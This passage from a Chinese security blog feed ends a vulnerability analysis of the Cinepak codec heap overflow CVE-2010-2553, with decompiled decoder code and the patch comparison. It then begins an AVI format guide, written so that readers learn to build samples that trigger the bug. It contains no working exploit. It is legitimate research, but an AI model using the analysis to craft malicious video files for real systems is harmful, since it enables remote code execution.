          ++num;                              <span class="comment">// codebook vector计数器</span></span><br><span class="line">            v31 += <span class="number">16</span>;                          <span class="comment">// 堆缓冲区指针+16</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( CVID_Chunk_ID_Ptr &gt;= <span class="number">6</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x24</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x26</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v9 &gt;= <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = Heap_UserPtr + <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( num &gt;= <span class="number">0x100</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v52 = *(_BYTE *)v7;</span><br><span class="line">            CVID_Chunk_ID_Ptr -= <span class="number">4</span>;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">1</span>) = v52;</span><br><span class="line">            *(_BYTE *)v6 = v52;</span><br><span class="line">            *(_BYTE *)(v6 - <span class="number">1</span>) = v52;</span><br><span class="line">            v53 = *(_BYTE *)(v7 + <span class="number">1</span>);</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">5</span>) = v53;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">4</span>) = v53;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">3</span>) = v53;</span><br><span class="line">            v54 = *(_BYTE *)(v7 + <span class="number">2</span>);</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">9</span>) = v54;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">8</span>) = v54;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">7</span>) = v54;</span><br><span class="line">            v55 = *(_BYTE *)(v7 + <span class="number">3</span>);</span><br><span class="line">            v7 += <span class="number">4</span>;</span><br><span class="line">            ++num;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">13</span>) = v55;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">12</span>) = v55;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">11</span>) = v55;</span><br><span class="line">            v6 += <span class="number">16</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( CVID_Chunk_ID_Ptr &gt;= <span class="number">4</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x25</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x27</span>:</span><br><span class="line">        v61 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v9 &gt;= <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v56 = (_BYTE *)(Heap_UserPtr + <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( num &gt;= <span class="number">0x100</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v61 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v61 )</span><br><span class="line">            &#123;</span><br><span class="line">              v6 = v61 &amp; v62;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v6 = swAdvance2(&amp;v61, (_BYTE **)&amp;v63, &amp;CVID_Chunk_ID_Ptr);</span><br><span class="line">              v7 = v63;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v6 &amp;&amp; CVID_Chunk_ID_Ptr &gt;= <span class="number">4</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v57 = *(_BYTE *)v7;</span><br><span class="line">              CVID_Chunk_ID_Ptr -= <span class="number">4</span>;</span><br><span class="line">              v56[<span class="number">1</span>] = v57;</span><br><span class="line">              *v56 = v57;</span><br><span class="line">              *(v56 - <span class="number">1</span>) = v57;</span><br><span class="line">              v58 = *(_BYTE *)(v7 + <span class="number">1</span>);</span><br><span class="line">              v56[<span class="number">5</span>] = v58;</span><br><span class="line">              v56[<span class="number">4</span>] = v58;</span><br><span class="line">              v56[<span class="number">3</span>] = v58;</span><br><span class="line">              v59 = *(_BYTE *)(v7 + <span class="number">2</span>);</span><br><span class="line">              v56[<span class="number">9</span>] = v59;</span><br><span class="line">              v56[<span class="number">8</span>] = v59;</span><br><span class="line">              v56[<span class="number">7</span>] = v59;</span><br><span class="line">              LOBYTE(v6) = *(_BYTE *)(v7 + <span class="number">3</span>);</span><br><span class="line">              v7 += <span class="number">4</span>;</span><br><span class="line">              v56[<span class="number">13</span>] = v6;</span><br><span class="line">              v56[<span class="number">12</span>] = v6;</span><br><span class="line">              v56[<span class="number">11</span>] = v6;</span><br><span class="line">              v63 = v7;</span><br><span class="line">            &#125;</span><br><span class="line">            ++num;</span><br><span class="line">            v56 += <span class="number">16</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( CVID_Chunk_ID_Ptr &gt;= <span class="number">4</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;所以这部分数据是<code>可以控制的</code>。但是，由于每次<code>堆块内存数据复制</code>时的<code>复制数据长度</code>(ecx)固定为<code>0x800*4=0x2000字节</code>，而超出<code>0x6000字节</code>堆块数据区域之后的<code>0x2000字节内存</code>包含一段<code>内存状态</code>(State)为<code>MEM_RESERVE</code>的内存，会造成<code>内存访问异常</code>，所以<code>无法控制EIP</code>。</p><h2 id="0x50-漏洞修复"><a href="#0x50-漏洞修复" class="headerlink" title="0x50 漏洞修复"></a>0x50 漏洞修复</h2><p>&emsp;&emsp;我们可以从<code>以下链接</code>找到此漏洞的<code>相关信息</code>，以及<code>漏洞补丁</code>的下载链接：</p><blockquote><ul><li>1、<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-055" target="_blank" rel="noopener">Microsoft 安全公告 MS10-055 - 严重</a></li><li>2、<a href="https://support.microsoft.com/zh-cn/topic/ms10-055-vulnerability-in-cinepak-codec-could-allow-remote-code-execution-db8b5255-4e65-b629-ad2e-e1f890a63d8f" target="_blank" rel="noopener">MS10-055: Vulnerability in Cinepak codec could allow remote code execution</a></li><li>3、<a href="https://www.catalog.update.microsoft.com/Search.aspx?q=ms10-055" target="_blank" rel="noopener">Microsoft Update Catalog - MS10-055</a></li></ul></blockquote><p>&emsp;&emsp;根据<code>测试环境</code>，下载对应的<code>漏洞补丁</code>。我这里下载的是<code>Windows XP</code>环境下的补丁。补丁<code>安装前</code>和<code>安装后</code>，<code>iccvid.dll</code>模块的版本如下：</p><blockquote><ul><li>安装前：1.10.0.12</li><li>安装后：1.10.0.13</li></ul></blockquote><p>&emsp;&emsp;书中用的是<code>Turbodiff</code>进行<code>补丁比较</code>的，它是<code>IDA</code>的一款<code>插件</code>。由于其长期<code>未更新</code>，且支持的IDA版本<code>较低</code>，所以这里还是用<code>BinDiff</code>来进行<code>补丁比较</code>。结果如下：</p><div align="left"><img src="/resources/2021/CVE-2010-2553/补丁前后关键函数对比图.png" width="80%" height="60%" alt="补丁前后关键函数对比图"></div><p>&emsp;&emsp;上图中的<code>红框部分</code>是<code>补丁代码</code>的关键部分，最初<code>esi</code>存储的是指向样本中<code>cinepak_codec_data1</code>的指针，通过<code>固定的偏移</code>，将<code>Number of coded strips</code>读出，存放在<code>局部变量[ebp-0x8]</code>中。然后将其<code>与3做比较</code>，如果<code>Number of coded strips&gt;3</code>，则将<code>Number of coded strips</code>修改为<code>3</code>，反之，则<code>不进行</code>任何操作。这段<code>补丁代码</code>主要是对<code>Number of coded strips</code>进行限制，只允许其<code>小于等于3</code>，若超过则<code>强制修改为3</code>。</p><p>&emsp;&emsp;一个<code>Frame</code>可能包含<code>多个Strip</code>，但是<code>第一个</code>必须是<code>“Strip CVID ID”</code>为<code>0x1000</code>的<code>Strip</code>。因为<code>第一次</code>进行堆块内存数据复制时，<code>源地址</code>(esi)为<code>堆块数据区域首地址</code>，<code>目的地址</code>(edi)为<code>堆块数据区域首地址+0x2000</code>，而堆块数据区域的<code>前0x2000字节</code>数据，正是由<code>“Strip CVID ID”</code>为<code>0x1000</code>的<code>Strip</code>解码得来的。当<code>Number of coded strips = 3</code>时，除去<code>“Strip CVID ID”</code>为<code>0x1000</code>的<code>Strip</code>外，还有2个是<code>“Strip CVID ID”</code>为<code>0x1100</code>的<code>Strip</code>。这样，只会进行<code>两次</code>堆块内存数据复制，所以<code>不会</code>造成堆溢出。</p><h2 id="0x60-Reference"><a href="#0x60-Reference" class="headerlink" title="0x60 Reference"></a>0x60 Reference</h2><blockquote><ul><li>1.漏洞战争:软件漏洞分析精要; 3.4 CVE-2010-2553,Microsoft Cinepak Codec CVDecompress函数堆溢出漏洞</li><li>2.0day安全:软件漏洞分析技术; 第5章、堆溢出利用</li><li>3.<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-055" target="_blank" rel="noopener">Microsoft 安全公告 MS10-055 - 严重</a></li><li>4.<a href="https://multimedia.cx/mirror/cinepak.txt" target="_blank" rel="noopener">Cinepak (CVID) stream format for AVI and QT</a></li><li>5.<a href="https://wiki.multimedia.cx/index.php?title=Cinepak" target="_blank" rel="noopener">MultiMedia Wiki - Cinepak</a></li><li>6.<a href="https://zhuanlan.zhihu.com/p/137836227" target="_blank" rel="noopener">知乎 - 刻意练习FFmpeg系列：颜色和像素</a></li><li>7.<a href="https://www.cnblogs.com/Ox9A82/p/5715673.html" target="_blank" rel="noopener">Ox9A82 - CVE-2010-2553 Microsoft Windows Cinepak编码解码器解压缩漏洞分析</a></li><li>8.<a href="https://www.cnblogs.com/csnd/p/11800534.html" target="_blank" rel="noopener">CVE-2010-2553：Microsoft Cinepak Codec CVDecompress 函数堆溢出漏洞调试分析</a></li><li>9.<a href="https://www.cnblogs.com/kissdodog/p/3730598.html" target="_blank" rel="noopener">Windbg 内存命令 《第四篇》</a></li><li>10.<a href="http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/17/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-2553/" target="_blank" rel="noopener">漏洞战争-cve-2010-2553</a></li></ul></blockquote>]]></content>
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> AVI </tag>
            
            <tag> Cinepak </tag>
            
            <tag> Heap Overflow </tag>
            
            <tag> FileFormat </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>AVI文件格式分析</title>
      <link href="/2020/12/30/AVI%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
      <url>/2020/12/30/AVI%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>因为接下来要分析的漏洞CVE-2010-2553，涉及到AVI文件格式。<br>所以，有必要详细了解一下AVI文件格式，这样，才能知道怎样构造出能达到漏洞利用的样本。<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p></blockquote><h2 id="1、AVI简介"><a href="#1、AVI简介" class="headerlink" title="1、AVI简介"></a>1、AVI简介</h2><h3 id="1-1、AVI基本概念"><a href="#1-1、AVI基本概念" class="headerlink" title="1.1、AVI基本概念"></a>1.1、AVI基本概念</h3><p>&emsp;&emsp;<code>AVI</code>是音频视频交错(<code>Audio Video Interleaved</code>)的缩写，它是<code>Microsoft</code>于1992年11月开发的一种符合<code>RIFF文件规范</code>的多媒体容器格式，作为其<code>Windows视频软件</code>的一部分。<code>AVI文件</code>可以在<code>文件容器</code>中同时包含<code>音频</code>和<code>视频</code>数据，该文件容器允许<code>同步播放</code>音频和视频。</p><p>&emsp;&emsp;许多<code>AVI文件</code>使用1996年2月由<code>Matrox OpenDML组</code>开发的文件格式扩展名。这些文件受<code>Microsoft</code>支持，并且被非正式地称为<code>“AVI 2.0”</code>。2010年，<code>美国政府</code>的<code>国家档案</code>和<code>记录管理局</code>将AVI定义为<code>官方文件格式</code>，用于保存<code>数字视频</code>。</p><p>&emsp;&emsp;<code>AVI</code>文件格式是<code>Resource Interchange File Format</code>(RIFF:资源交换文件格式)的<code>子格式</code>。<code>RIFF</code>是一种<code>通用文件容器格式</code>，用于将<code>数据</code>存储在<code>带标签</code>的块中。它主要用于存储<code>多媒体</code>，例如<code>声音</code>和<code>视频</code>，尽管它也可以用于存储<code>任意数据</code>。<code>RIFF文件</code>所包含的<code>数据类型</code>由该文件的<code>扩展名</code>来标识，能以<code>RIFF文件</code>存储的数据包括：<code>音频视频交错格式数据</code>(.AVI)、<code>波形格式数据</code>(.WAV)、<code>位图格式数据</code>(.RDI)、<code>MIDI格式数据</code>(.RMI)、<code>调色板格式数据</code>(.PAL)、<code>多媒体电影格式数据</code>(.RMN)、<code>动画光标格式数据</code>(.ANI)、<code>其它RIFF文件</code>(.BND)。</p><p>可以查看<strong><code>AVI文件结构</code></strong>的软件：<br>1、<a href="https://www.menasoft.com/blog/?p=34" target="_blank" rel="noopener">RIFF File Viewer - RIFFPad v0.73 by Menasoft</a><br>2、<a href="https://download.csdn.net/download/sailingthink/4460808" target="_blank" rel="noopener">AtomicBrowser Version 2.0, Written by David Mojdehi</a></p><h3 id="1-2、AVI文件类型"><a href="#1-2、AVI文件类型" class="headerlink" title="1.2、AVI文件类型"></a>1.2、AVI文件类型</h3><p>&emsp;&emsp;基本上，有<code>3种类型</code>的AVI文件：</p><blockquote><ul><li><strong><code>AVI1.0</code></strong>: 原始的，<code>旧的</code>AVI文件。</li><li><strong><code>Open-DML(AVI2.0)</code></strong>: AVI文件格式的<code>扩展</code>，版本1.02已在1996年2月28日推出。最重要的<code>改进</code>是：<ul><li>对<code>文件大小</code>几乎没有限制(例如，比NTFS所允许的要多得多)</li><li>减少了33%的<code>开销</code></li></ul></li><li><strong><code>Hybride-Files</code></strong>(混合文件): 出于<code>兼容性</code>原因，<code>Open-DML文件</code>包含附加的<code>旧版索引</code>。这不是那些文件的<code>“官方”</code>词汇，但它很好地描述了那种<code>文件类型</code>。仅包含<code>一个RIFF列表</code>的Hybride文件可以被视为<code>任一文件类型</code>。</li></ul></blockquote><p>&emsp;&emsp;<code>AVI 1.0</code>是最基本的格式，由于<code>索引地址</code>与<code>大小</code>用<code>4字节</code>表示，所以最大支持<code>4G容量</code>，而且与<code>文件系统</code>类型有关，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- Video for Windows (AVI 1.0)</span><br><span class="line">- FAT (FAT16): 4GB (2GB practical, safe)</span><br><span class="line">- FAT32: 4GB (2GB practical, safe)</span><br><span class="line">- NTFS: 4GB (2GB practical, safe)</span><br><span class="line"></span><br><span class="line">为了安全一般限制为2G。</span><br></pre></td></tr></table></figure></p><h3 id="1-3、基本数据结构"><a href="#1-3、基本数据结构" class="headerlink" title="1.3、基本数据结构"></a>1.3、基本数据结构</h3><h4 id="1-3-1、RIFF文件的基本数据结构"><a href="#1-3-1、RIFF文件的基本数据结构" class="headerlink" title="1.3.1、RIFF文件的基本数据结构"></a>1.3.1、RIFF文件的基本数据结构</h4><p>&emsp;&emsp;<strong><code>Chunk</code></strong>是组成RIFF文件的<code>基本单元</code>，其<code>基本结构</code>如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    u32 id;         <span class="comment">//块标志</span></span><br><span class="line">    u32 size;       <span class="comment">//块大小</span></span><br><span class="line">    u8 data[size];   <span class="comment">//块内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong><code>id</code></strong>: 此块的<code>标识符</code>，由<code>4个ASCII字符</code>组成的<code>FourCC</code>数据格式标识符，用以识别块中所<code>包含的数据</code>。如：<code>“RIFF”</code>、<code>“LIST”</code>、<code>“AVI ”</code>、<code>“WAVE”</code>等等。</li><li><strong><code>size</code></strong>: 存储在<code>data域</code>中的<code>数据的长度</code>，<code>id</code>和<code>size</code>域的大小<code>不包括</code>在该值内。</li><li><strong><code>data</code></strong>: 块内容，具有<code>前一个字段</code>中给定大小的数据。其中的数据是<code>以字(Word)为单位</code>排列的，如果该数据长度为<code>奇数</code>，则在最后添加一个<code>空字节(Null)</code>。</li></ul></blockquote><p>&emsp;&emsp;两个块标识符<code>“RIFF”</code>和<code>“LIST”</code>引入了可以<code>包含子块</code>的块。而其它块<code>仅能含有数据</code>。<code>“RIFF”</code>和<code>“LIST”</code>类型的<code>Chunk结构</code>如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    u32 id;                 <span class="comment">//块标志</span></span><br><span class="line">    u32 size;               <span class="comment">//块大小</span></span><br><span class="line">    u32 type;               <span class="comment">//块类型</span></span><br><span class="line">    u8 restdata[size<span class="number">-4</span>];    <span class="comment">//data中除type所占的4个字节后剩余的数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;可以看出<code>“RIFF”</code>和<code>“LIST”</code>也是<code>Chunk</code>，只是它的<code>data</code>由<code>type</code>和<code>restdata</code>两部分组成。</p><blockquote><ul><li><strong><code>type</code></strong>: 由<code>4个ASCII字符</code>组成的<code>FourCC</code>数据格式标识符，代表<code>“RIFF”</code>文件的类型，如：<code>“WAVE”</code>、<code>“AVI ”</code>；或者是<code>“LIST”</code>块的类型，如AVI文件中的列表<code>“hdrl”</code>、<code>“movi”</code>。</li><li><strong><code>restdata</code></strong>: <code>data</code>中除<code>type</code>所占的4个字节后<code>剩余的数据</code>，包括块内容，包含若干<code>“Chunk”</code>和<code>“LIST”</code>。</li></ul></blockquote><p><strong><code>FourCC:</code></strong><br>&emsp;&emsp;<code>FourCC</code>(“four-character code”)是<code>四个字节</code>(通常为<code>ASCII</code>)的序列，用于<code>唯一标识数据格式</code>。在<code>RIFF</code>文件格式中，<code>FourCC</code>非常普遍,<code>struct chunk</code>中的<code>id</code>成员，<code>“RIFF”</code>和<code>“LIST”</code>的<code>type</code>成员，<code>起始标识</code>等信息都是用<code>FourCC</code>表示的。<code>FourCC</code>一般是四个字符，如<code>&#39;abcd&#39;</code>这样的形式，也可以<code>三个字符</code>包含一个<code>空格</code>，如<code>&#39;abc &#39;</code>这样的形式。<code>AVI</code>文件格式使用<code>FourCC</code>编码标识<code>流类型</code>，<code>数据块</code>，<code>索引条目</code>和其他信息。</p><h4 id="1-3-2、AVI文件的基本数据结构"><a href="#1-3-2、AVI文件的基本数据结构" class="headerlink" title="1.3.2、AVI文件的基本数据结构"></a>1.3.2、AVI文件的基本数据结构</h4><p>&emsp;&emsp;在<code>AVI文件</code>中，有两种基本单元<code>“Chunks”</code>和<code>“Lists”</code>，与<code>RIFF文件</code>中的<code>基本单元</code>差别不大，就是<code>字段名称</code>稍有不同，其结构如下：</p><p><strong><code>Chunks:</code></strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    DWORD dwFourCC;</span><br><span class="line">    DWORD dwSize;       <span class="comment">//data</span></span><br><span class="line">    BYTE data[dwSize];  <span class="comment">//contains headers or video/audio data</span></span><br><span class="line">&#125;CHUNK;</span><br></pre></td></tr></table></figure></p><blockquote><ul><li><strong><code>dwFourCC</code></strong>: 标识本<code>“CHUNK”</code>所包含的<code>数据类型</code>，如：<code>“avih”</code>(AVI Header)、<code>“strh”</code>(Stream Header)、<code>“strf”</code>(Stream Format)、<code>“00dc”</code>(编号为00的视频数据块)。</li><li><strong><code>dwSize</code></strong>: 本CHUNK所包含<code>数据的大小</code>，不包括<code>dwFourCC</code>和<code>dwSize</code>所占的8个字节。</li><li><strong><code>data</code></strong>: 本CHUNK所包含的<code>数据</code>，大小由上一个字段<code>dwSize</code>指定。可以为<code>Header</code>、<code>视频</code>/<code>音频</code>数据。</li></ul></blockquote><p><strong><code>Lists:</code></strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    DWORD dwList;</span><br><span class="line">    DWORD dwSize;         <span class="comment">//dwFourCC+data</span></span><br><span class="line">    DWORD dwFourCC; </span><br><span class="line">    BYTE data[dwSize<span class="number">-4</span>];  <span class="comment">//contains Lists and Chunks</span></span><br><span class="line">&#125;LIST;</span><br></pre></td></tr></table></figure></p><blockquote><ul><li><strong><code>dwList</code></strong>: LIST的<code>类型</code>，其值可以为<code>“RIFF”</code>(“RIFF-List”)或<code>“LIST”</code>(“List”)。</li><li><strong><code>dwSize</code></strong>: 本LIST所包含<code>数据的大小</code>，嵌套<code>List</code>和<code>Chunk</code>的<code>数据大小之和</code>。包含<code>dwFourCC</code>和<code>data</code>。</li><li><strong><code>dwFourCC</code></strong>: 由<code>4个ASCII字符</code>组成的<code>FourCC</code>数据格式标识符，代表<code>“RIFF”</code>文件的类型，如：<code>“WAVE”</code>、<code>“AVI ”</code>；或者是<code>“LIST”</code>块的类型，如<code>AVI文件</code>中的列表<code>“hdrl”</code>、<code>“movi”</code>。</li><li><strong><code>data</code></strong>: 本LIST所包含的<code>数据</code>，其大小为<code>dwSize-4</code>。<code>数据内容</code>可以是若干个<code>List</code>和<code>Chunk</code>。</li></ul></blockquote><h2 id="2、AVI文件结构"><a href="#2、AVI文件结构" class="headerlink" title="2、AVI文件结构"></a>2、AVI文件结构</h2><h3 id="2-1、AVI文件整体布局"><a href="#2-1、AVI文件整体布局" class="headerlink" title="2.1、AVI文件整体布局"></a>2.1、AVI文件整体布局</h3><p>&emsp;&emsp;我们用如下的方式来表示一个<code>LIST块</code>(dwSize省略):</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LIST (dwFourCC (data))</span><br><span class="line">LIST ('hdrl' ...)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>可选块</code>我们用<code>“[]”</code>括起来：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">['idx1' (&lt;AVI Index&gt;) ]</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>AVI文件格式</code>将文件的数据分为一个一个<code>“Chunk”</code>，每个<code>“Chunk”</code>都由<code>FourCC</code>标签标识。<code>AVI文件格式</code>采用<code>RIFF格式</code>的文件中<code>单个“Chunk”</code>的形式，然后细分为<code>两个必须的“List Chunk”</code>(“hdrl”和“movi”)和<code>一个可选的“Index Chunk”</code>(“idx1”)。下面是一个<code>简化的</code>AVI文件布局：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RIFF ('AVI '</span><br><span class="line">      LIST ('hdrl' ... )</span><br><span class="line">      LIST ('movi' ... )</span><br><span class="line">      ['idx1' (&lt;AVI Index&gt;) ]</span><br><span class="line">     )</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>“hdrl”列表</code>定义了本AVI文件所保存的<code>数据的格式</code>，是<code>第一个</code>必须的<code>LIST块</code>。<code>“movi”列表</code>保存的是AVI的<code>音频/视频序列数据</code>，是<code>第二个</code>必须的<code>LIST块</code>。<code>“idx1”</code>为<code>“movi”列表</code>中包含的<code>音频/视频序列数据块</code>在<code>文件中位置</code>的<code>列表</code>。</p><p>&emsp;&emsp;AVI文件的<code>实际数据</code>中，使用了<code>列表(List)</code>和<code>块(Chunk)</code>的形式来组织。<code>列表(List)</code>可以嵌套<code>列表(List)</code>和<code>块(Chunk)</code>。<code>整个AVI文件</code>可以看成一个<code>List数据块</code>，其<code>dwList</code>为<code>“RIFF”</code>，称为<code>“RIFF-List”</code>块，其<code>dwFourCC</code>为<code>“AVI”</code>。一个AVI文件中只允许存在<code>一个RIFF块</code>。RIFF块中包含<code>一系列的子块</code>，其中有一种子块的<code>dwList</code>为<code>“LIST”</code>，称为<code>LIST块</code>，<code>LIST块</code>中可以再包含<code>一系列的子块</code>，但除了<code>LIST块</code>外的<code>其他所有的子块</code>都不能再包含子块。</p><p>&emsp;&emsp;<code>“hdrl”</code>和<code>“movi”</code>LIST块使用<code>子块</code>作为它们的<code>数据</code>，我们将其展开，以下示例显示了一个较为<code>完整的</code>AVI文件的布局：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">RIFF ('AVI '</span><br><span class="line">      LIST ('hdrl'</span><br><span class="line">            'avih'(&lt;Main AVI Header&gt;)</span><br><span class="line">            LIST ('strl'</span><br><span class="line">                  'strh'(&lt;Stream header&gt;)</span><br><span class="line">                  'strf'(&lt;Stream format&gt;)</span><br><span class="line">                  [ 'strd'(&lt;Additional header data&gt;) ]</span><br><span class="line">                  [ 'strn'(&lt;Stream name&gt;) ]</span><br><span class="line">                  ...</span><br><span class="line">                 )</span><br><span class="line">             ...</span><br><span class="line">           )</span><br><span class="line">      LIST ('INFO' INAM("Two Trees"Z)</span><br><span class="line">                   ICMT(<span class="string">"A picture for the opening screen"</span>Z) </span><br><span class="line">           )</span><br><span class="line">      LIST ('movi'</span><br><span class="line">            &#123;SubChunk | LIST ('rec '</span><br><span class="line">                              SubChunk1</span><br><span class="line">                              SubChunk2</span><br><span class="line">                              ...</span><br><span class="line">                             )</span><br><span class="line">               ...</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">           )</span><br><span class="line">      ['idx1' (&lt;AVI Index&gt;) ]</span><br><span class="line">     )</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;每个<code>AVI文件</code>都具有以下<code>布局</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RIFF AVI    //强制</span><br><span class="line">&#123;RIFF AVIX&#125; //仅适用于Open-DML文件</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;将其中<code>dwFourCC =&#39;AVI&#39;</code>的RIFF-List称为<code>&#39;RIFF-AVI-List&#39;</code>，将其中<code>dwFourCC =&#39;AVIX&#39;</code>的RIFF-List称为<code>&#39;RIFF-AVIX-List&#39;</code>。</p><p>&emsp;&emsp;与<code>uint32</code>(4字节)的<code>表示范围</code>不同，这些列表的<code>大小限制</code>不是<code>4GB</code>，而是</p><blockquote><ul><li>对于<strong><code>AVI 1.0</code></strong>：大小(<code>RIFF-AVI</code>) &lt; <code>2GB</code></li><li>对于<strong><code>Open-DML</code></strong>：<ul><li>size(<code>RIFF-AVI</code>) &lt; <code>1GB</code> (假设某些混合应用程序(例如VirtualDub！)为2GB)</li><li>size(<code>RIFF-AVIX</code>) &lt; <code>2GB</code></li></ul></li></ul></blockquote><p>&emsp;&emsp;由于<code>Windows XP</code>会在未找到<code>旧索引</code>的情况下坚持读取<code>整个第一个RIFF AVI列表</code>，并且由于<code>旧索引</code>会导致<code>开销</code>，因此建议创建<code>尽可能小</code>的<code>RIFF-AVI-List</code>。</p><h3 id="2-2、hdrl-List-Headerlist"><a href="#2-2、hdrl-List-Headerlist" class="headerlink" title="2.2、hdrl List(Headerlist)"></a>2.2、hdrl List(Headerlist)</h3><p>&emsp;&emsp;<strong><code>“hdrl 